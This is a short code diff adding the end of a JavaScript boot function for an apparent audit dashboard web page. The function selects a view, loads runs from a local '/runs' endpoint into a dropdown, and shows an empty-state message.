+  if (["live", "report", "firewall"].includes(v)) view = v;
+  if (EXPORT) { runId = EXPORT.id; st = fromEvents(EXPORT.events); rep = EXPORT.report; paint(); return; }
+  runs = await (await fetch("/runs")).json();
+  $("#runsel").innerHTML = runs.map((r) => `<option value="${r.id}">${r.id}${r.scripted ? " (SAMPLE)" : ""} - ${r.status}</option>`).join("");
+  runId = runs.find((r) => r.id === h)?.id || runs[0]?.id;
+  if (runId) $("#runsel").value = runId;
+  if (!runId) { $("#view").innerHTML = `<div class="empty">No runs yet. Run <code>redline audit</code> or <code>python scripts/gen_samples.py</code>.</div>`; return; }
+  start(true);
+}
+boot();
+
+})();</script></body></html>
